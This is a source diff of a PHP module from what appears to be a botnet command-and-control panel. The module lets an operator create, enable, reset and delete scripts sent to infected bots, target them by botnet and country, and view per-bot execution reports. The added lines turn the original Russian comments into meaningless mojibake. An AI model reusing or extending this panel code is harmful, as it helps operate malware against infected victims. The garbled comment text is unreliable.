@@ -1,13 +1,13 @@
 <?php if(!defined('__CP__'))die();
 $_allow_edit = !empty($userData['r_botnet_scripts_edit']);
-define('LIST_ROWS_COUNT', $_allow_edit ? 8 : 7); //Количетсво колонок в списке.
-define('SCRIPT_INPUT_TEXT_WIDTH', '600px');      //Ширина edit-боксов для редактирования скрипта.
-define('BOTS_PER_PAGE', 50);                     //Количетсво ботов на страницу.
-define('BOTSLIST_ROWS_COUNT', 7);                //Количетсво столбцов в  списке ботов.
+define('LIST_ROWS_COUNT', $_allow_edit ? 8 : 7); //RљRѕR "Republic ‡ RμS, SЃRІRѕ RєRѕR" RѕRЅRѕRє RІ SЃRїReSЃRєRμ.
+define('SCRIPT_INPUT_TEXT_WIDTH', '600px');      //REReSЂReRЅR ° edit-P ± RѕRєSЃRѕRІ RґR "SЏ SЂRμRґR ° RєS, ReSЂRѕRІR RЅReSЏ SЃRєSЂReRїS °, P °.
+define('BOTS_PER_PAGE', 50);                     //RљRѕR "Republic ‡ RμS, SЃRІRѕ P ± RѕS, RѕRІ RЅR ° SЃS, SЂR ° RЅReS † Sѓ.
+define('BOTSLIST_ROWS_COUNT', 7);                //RљRѕR "Republic ‡ RμS, SЃRІRѕ SЃS, RѕR" P ± C † RѕRІ RІ SЃRїReSЃRєRμ P ± RѕS, RѕRІ.
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Изменение статуса.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if($_allow_edit && isset($_GET['status'], $_GET['enable']) && is_numeric($_GET['status']) && is_numeric($_GET['enable']))
 {
@@ -17,54 +17,54 @@ if($_allow_edit && isset($_GET['status'], $_GET['enable']) && is_numeric($_GET['
   die();
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Дейтсвия над выделеными элементами.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P RμR № C SЃRІReSЏ RЅR ° Rґ RІS <RґRμR "RμRЅS <RјRe SЌR" RμRјRμRЅS, P ° RјRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if($_allow_edit && isset($_GET['scriptsaction']) && !empty($_GET['scripts']) && is_array($_GET['scripts']))
 {
-  //Преврашаем массив в часть запроса.
+  //RџSЂRμRІSЂR ° C € P ° RμRј RјR SЃSЃReRІ RІ ° C ‡ P ° SЃS, SЊ P · RїSЂRѕSЃR P ° °.
   $sl = '';
   $count = 0;
   foreach($_GET['scripts'] as $id)if(is_numeric($id))$sl .= ($count++ == 0 ? '' : ' OR ')."id='".addslashes($id)."'";
   
-  //Статус.
+  //RЎS, P ° C SѓSЃ.
   if($_GET['scriptsaction'] == 0 || $_GET['scriptsaction'] == 1)
   {
     if(!mysqlQueryEx('botnet_scripts', "UPDATE botnet_scripts SET flag_enabled='".($_GET['scriptsaction'] == 0 ? 1 : 0)."' WHERE {$sl}"))ThemeMySQLError();
   }
-  //Сброс.
+  //RЎR ± SЂRѕSЃ.
   else if($_GET['scriptsaction'] == 2)
   {
     if(!($r = mysqlQueryEx('botnet_scripts', "SELECT id, extern_id FROM botnet_scripts WHERE {$sl}")))ThemeMySQLError();
   
-    //Обновляем.
+    //RћR ± RЅRѕRІR "SЏRμRј.
     while(($m = @mysql_fetch_row($r)))
     {
       if(mysqlQueryEx('botnet_scripts', "UPDATE botnet_scripts SET extern_id='".addslashes(md5($m[1].CURRENT_TIME, true))."' WHERE id='".addslashes($m[0])."' LIMIT 1"))
       {
-        //Удаляем старые отчеты.
+        //RЈRґR ° P "SЏRμRј SЃS, P ° SЂS <Rμ RѕS, C ‡ RμS, C <.
         mysqlQueryEx('botnet_scripts_stat', "DELETE FROM botnet_scripts_stat WHERE extern_id='".addslashes($m[1])."'");
       }
     }
   }
-  //Удаление.
+  //RЈRґR ° P "RμRЅReRμ.
   else if($_GET['scriptsaction'] == 3)
   {
-    //Отключаем все команды.
+    //RћS, RєR "SЋS ‡ P ° RμRј RІSЃRμ RєRѕRјR RЅRґS ° <.
     if(!mysqlQueryEx('botnet_scripts', "UPDATE botnet_scripts SET flag_enabled='0' WHERE {$sl}"))ThemeMySQLError();
     
-    //FIXME: Оптимизировать запросы.
+    //FIXME: RћRїS, ReRјReR · ReSЂRѕRІR ° C, P SЊ · P ° RїSЂRѕSЃS <.
     if(!($r = mysqlQueryEx('botnet_scripts', "SELECT extern_id FROM botnet_scripts WHERE {$sl}")))ThemeMySQLError();
     
     $sl2 = '';
     $count = 0;
     while(($m = @mysql_fetch_row($r)))$sl2 .= ($count++ == 0 ? '' : ' OR ')."extern_id='".addslashes($m[0])."'";
     
-    //Удаляем отчеты.
+    //RЈRґR ° P "SЏRμRј RѕS, C ‡ RμS, C <.
     if(!mysqlQueryEx('botnet_scripts_stat', "DELETE FROM botnet_scripts_stat WHERE {$sl2}"))ThemeMySQLError();
     
-    //Удаляем скрипт.
+    //RЈRґR ° P "SЏRμRј SЃRєSЂReRїS.
     if(!mysqlQueryEx('botnet_scripts', "DELETE FROM botnet_scripts WHERE {$sl}"))ThemeMySQLError();
   }
   
@@ -72,15 +72,15 @@ if($_allow_edit && isset($_GET['scriptsaction']) && !empty($_GET['scripts']) && 
   die();
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Изменение/просмотр скрипта.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GET['new']) && $_allow_edit))
 {  
   $errors = array();
 
-  //Внесение изменений.
+  //R'RЅRμSЃRμRЅReRμ Pepsi · RјRμRЅRμRЅReR №.
   if($_allow_edit && isset($_POST['name'], $_POST['status'], $_POST['limit'], $_POST['bots'], $_POST['botnets'], $_POST['countries'], $_POST['context']))
   {
     if(strlen($_POST['name']) < 1)$errors[] = LNG_BOTNET_SCRIPT_E_NAME;
@@ -88,7 +88,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
     
     if(count($errors) == 0)
     {
-      //Основные данные.
+      //RћSЃRЅRѕRІRЅS <Rμ RґR ° RЅRЅS <Rμ.
       $q = "name='".addslashes($_POST['name'])."',".
            "flag_enabled='".($_POST['status'] ? 1 : 0)."',".
            "send_limit='".addslashes(is_numeric($_POST['limit']) ? intval($_POST['limit']) : 0)."',".
@@ -96,18 +96,18 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
            expressionToSqlLists('botnets', $_POST['botnets']).",".
            expressionToSqlLists('countries', $_POST['countries']).",".
            "script_text='".addslashes($_POST['context'])."',".
-           "script_bin=script_text"; //FIXME: Оптимизация кода.
+           "script_bin=script_text"; //FIXME: RћRїS, ReRјReR · P ° C † ReSЏ RєRѕRґR °.
       
-      //Выбор запроса.
+      //R'S <P ± P RѕSЂ · RїSЂRѕSЃR P ° °.
       if($is_view)$q = "UPDATE botnet_scripts SET {$q} WHERE id='".addslashes($_GET['view'])."' LIMIT 1";
       else
       {
         $eid = addslashes(md5(CURRENT_TIME.$_POST['context'], true));
-        @sleep(2); //Наверное, уменьшает вероятность совпадения ID.
+        @sleep(2); //RќR ° RІRμSЂRЅRѕRμ, SѓRјRμRЅSЊS € P ° RμS, RІRμSЂRѕSЏS, RЅRѕSЃS, SЊ SЃRѕRІRїR ° RґRμRЅReSЏ ID.
         
         $q = "INSERT INTO botnet_scripts SET {$q}, time_created='".addslashes(CURRENT_TIME)."', extern_id='{$eid}'";
         
-        //На всякий случай.
+        //RќR ° RІSЃSЏRєReR number SЃR "SѓS ‡ P ° P №.
         mysqlQueryEx('botnet_scripts_stat', "DELETE FROM botnet_scripts_stat WHERE extern_id='{$eid}'"); 
       }
       
@@ -118,7 +118,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
     }
   }
   
-  //Получаем данные скрипта.
+  //RџRѕR "SѓS ‡ P ° ° RμRј RґR RЅRЅS <Rμ SЃRєSЂReRїS, P °.
   if(count($errors) > 0)
   {
     $f_name       = htmlEntitiesEx($_POST['name']);
@@ -159,10 +159,10 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
     $f_context    = '';
   }
   
-  //Вывод формы.
+  //R'S <RІRѕRґ C RѕSЂRјS <.
   $data = '';
   
-  //Вывод ошибки.
+  //R'S <RІRѕRґ RѕS € Pepsi ± RєRe.
   if(count($errors) > 0)
   {
     $data .= THEME_STRING_FORM_ERROR_1_BEGIN;
@@ -228,10 +228,10 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
   
   $js_script = 0;
   
-  //Вывод списка ботов.  
+  //R'S <RІRѕRґ SЃRїReSЃRєR ° F ± RѕS, RѕRІ.
   if($is_view)
   {
-    //JavaScript скрипты.
+    //JavaScript SЃRєSЂReRїS, C <.
     $_FULL_QUERY = QUERY_STRING.'&view='.urlencode($_GET['view']);
     $js_sort = addJsSlashes($_FULL_QUERY);
     $_FULL_QUERY .= assocateSortMode(array('rtime', 'type', 'bot_id', 'bot_version', 'report'));
@@ -241,7 +241,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
                  jsSetSortMode($js_sort).
                  "function ChangePage(p){window.location='{$js_page}&page=' + p; return false;}";
 
-    //Выполняем запрос.
+    //R'S <RїRѕR "RЅSЏRμRј P · P ° RїSЂRѕSЃ.
     $cur_page   = (!empty($_GET['page']) && is_numeric($_GET['page']) ? $_GET['page'] : 1);
     $page_count = 0;
     $page_list  = '';
@@ -250,11 +250,11 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
     $sortmode = ' ORDER BY '.$_sortColumn.($_sortOrder == 0 ? ' ASC' : ' DESC');
     if($_sortColumnId != 0)$sortmode .= ', bot_id'.($_sortOrder == 0 ? ' ASC' : ' DESC');
 
-    //Получение обшего кол. элементов.
+    //RџRѕR "SѓS ‡ RμRЅReRμ RѕR ± C € RμRіRѕ RєRѕR. SЌR "RμRјRμRЅS, RѕRІ.
     $r = mysqlQueryEx('botnet_scripts_stat', 'SELECT COUNT(*) FROM botnet_scripts_stat WHERE extern_id=\''.addslashes($m[10]).'\'');
     if(($mt = @mysql_fetch_row($r)))
     {
-      //Создание списка страниц.
+      //RЎRѕR · RґR ° RЅReRμ SЃRїReSЃRєR ° SЃS, SЂR ° RЅReS †.
       if(($page_count = ceil($mt[0] / BOTS_PER_PAGE)) > 1)
       {
         $page_list = 
@@ -267,7 +267,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
       $bots_count = $mt[0];
     }
     
-    //Получение списка элементов.
+    //RџRѕR "SѓS ‡ RμRЅReRμ SЃRїReSЃRєR ° SЌR" RμRјRμRЅS, RѕRІ.
     $offset = (($cur_page - 1) * BOTS_PER_PAGE);
     $blist = '';
     if(!$r ||
@@ -305,7 +305,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
       }
     }
     
-    //Создание списока дейтвий.
+    //RЎRѕR · RґR ° RЅReRμ SЃRїReSЃRѕRєR RґRμR № ° C RІReR №.
     $actions = '';
     if($bots_count > 0 && count($botMenu) > 0)
     {
@@ -315,7 +315,7 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
       $actions = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $actions, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
     }
 
-    //Вывод таблицы.
+    //R'S <RІRѕRґ C, P ° P ± P "Republic † C <.
     $data .=
     THEME_VSPACE.
     str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('reportslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
@@ -347,16 +347,16 @@ if(($is_view = isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GE
   die();
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// JavaScript скрипты.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// JavaScript SЃRєSЂReRїS, C <.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 $js_script = 0;
 if($_allow_edit)$js_script = jsCheckAll('scriptslist', 'checkall', 'scripts[]')."function ExecuteAction(){return confirm('".addJsSlashes(LNG_BOTNET_LIST_ACTION_Q)."');}";
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Создание списка команд.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RЎRѕR · RґR RЅReRμ SЃRїReSЃRєR ° ° ° RєRѕRјR RЅRґ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 $list = '';
 if(!($r = mysqlQueryEx('botnet_scripts', 'SELECT id, extern_id, name, flag_enabled, send_limit, time_created FROM botnet_scripts ORDER BY time_created ASC')) || @mysql_affected_rows() === 0)
@@ -398,11 +398,11 @@ else for($i = 0; ($mt = @mysql_fetch_row($r)) !== false; $i++)
   }
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Вывод.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// R'S <RІRѕRґ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-//Список действий.
+//RЎRїReSЃRѕRє RґRμR number SЃS, RІReR №.
 $al = '';
 if($_allow_edit)
 {
@@ -421,7 +421,7 @@ if($_allow_edit)
   $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
 }
 
-//Вывод.
+//R'S <RІRѕRґ.
 ThemeBegin(LNG_BOTNET, $js_script, 0, 0);
 if($_allow_edit)echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('scriptslist', QUERY_SCRIPT_HTML, ' onsubmit="return ExecuteAction()"'), THEME_FORMGET_BEGIN).FORM_CURRENT_MODULE;
 
@@ -458,9 +458,9 @@ ThemeEnd();
 
 die();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Разделяет регулярное вырожения на черный и белий список.
@@ -477,21 +477,21 @@ function expressionToSqlLists($name, $exp)
   $wl     = array();
   $cur_wl = true;
   
-  //Заполняем списки.
+  //P-P ° RїRѕR "RЅSЏRμRј SЃRїReSЃRєRe.
   foreach($list as $item)
   {
     if($item[1] == 0)
     {
-      //Игнорируем условие OR или AND.
+      //P-P ° RїRѕR "RЅSЏRμRј SЃRїReSЃRєRe.
       if(strcmp($item[0],  'OR') === 0 || strcmp($item[0], 'AND') === 0)continue;
       if(strcmp($item[0], 'NOT') === 0)
       {
-        $cur_wl = false;//Или $cur_wl = !$cur_wl.
+        $cur_wl = false;//P-P ° RїRѕR "RЅSЏRμRј SЃRїReSЃRєRe.
         continue;
       }
     }
     
-    $item = str_replace("\x01", "\x02", $item[0]); //Заменяем спец. символ.
+    $item = str_replace("\x01", "\x02", $item[0]); //P-P ° RјRμRЅSЏRμRј SЃRїRμS †. SЃReRјRІRѕR.
     if($cur_wl)$wl[] = $item;
     else       $bl[] = $item;
   }
@@ -500,14 +500,12 @@ function expressionToSqlLists($name, $exp)
          "`{$name}_bl`='".addslashes((count($bl) > 0 ? "\x01".implode("\x01", $bl)."\x01" : ''))."'";
 }
 
-/*
-  Преобразует черный и белый списки в регулярное выражение.
-  
-  IN $wl - string, белый список.
-  IN $bl - string, черный список.
-  
-  Return - string, регулярное выражение.
-*/
+/*  RџSЂRμRѕR ± SЂR ° F · SѓRμS, C ‡ RμSЂRЅS <P № Pe ± RμR P "C <P № SЃRїReSЃRєRe RІ SЂRμRіSѓR" SЏSЂRЅRѕRμ RІS <SЂR ° P ¶ RμRЅReRμ.
+  
+  IN $ wl - string, P ± RμR "C <P № SЃRїReSЃRѕRє.
+  IN $ bl - string, C ‡ RμSЂRЅS <P № SЃRїReSЃRѕRє.
+  
+  Return - string, SЂRμRіSѓR "SЏSЂRЅRѕRμ RІS <SЂR ° P ¶ RμRЅReRμ.*/
 function SQLListToExp($wl, $bl)
 {
   $l[0] = explode("\x01", $wl);
